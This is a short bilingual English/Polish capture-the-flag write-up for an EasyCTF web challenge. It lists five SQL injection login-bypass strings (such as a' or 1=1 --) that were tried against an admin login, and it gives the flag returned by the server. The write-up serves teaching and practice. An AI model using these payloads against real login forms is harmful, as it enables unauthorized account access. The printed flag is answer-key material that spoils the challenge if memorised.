## SQL_Injection_1 [WEB 100]

>I need help logging into this website to get my flag! If it helps, my username is admin.
>http://injection1.web.easyctf.com/

### EN / [PL](#rozwiązanie)

### Solution:

Hit after fifth attempt

```
a' or 1=1 -- 
a' or '1'='1' -- 
a' or 1=1;
a' or '1'='1' -- '
a" or 1=1 -- "
```

Server response:

```
Thanks for logging in. Your flag is easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}
```

### [EN](#solution) / PL

### Rozwiązanie:

Kilka prób i trafienie za 5 razem :-)

```
a' or 1=1 -- 
a' or '1'='1' -- 
a' or 1=1;
a' or '1'='1' -- '
a" or 1=1 -- "
```

Odpowiedź serwera:

```
Thanks for logging in. Your flag is easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}
```
